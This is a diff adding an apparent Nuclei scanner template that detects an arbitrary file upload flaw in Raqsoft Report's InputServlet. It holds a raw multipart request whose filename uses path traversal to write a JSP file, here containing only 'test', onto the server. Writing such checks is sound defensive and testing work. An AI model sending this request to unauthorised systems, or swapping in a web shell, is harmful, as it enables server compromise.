@@ -1,0 +1,42 @@
+id: raqsoft_InputServlet_FileUpload
+
+info:
+  name: raqsoft_InputServlet_FileUpload
+  author: hamal
+  severity: high
+  description: 润乾报表InputServlet存在任意文件上传漏洞
+  reference:
+    - https://
+  tags: 微信公众号（实战安全研究）
+
+http:
+  - raw:
+      - |-
+        POST /InputServlet?action=12 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=00contentOboundary00
+        Connection: close
+        Content-Length: 240
+
+        --00contentOboundary00
+        Content-Disposition: form-data; name="upsize"
+
+        1024
+        --00contentOboundary00
+        Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\12.jsp"
+        Content-Type: image/jpeg
+
+        test
+        --00contentOboundary00--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 12.jsp
+      - type: status
+        status:
+          - 200
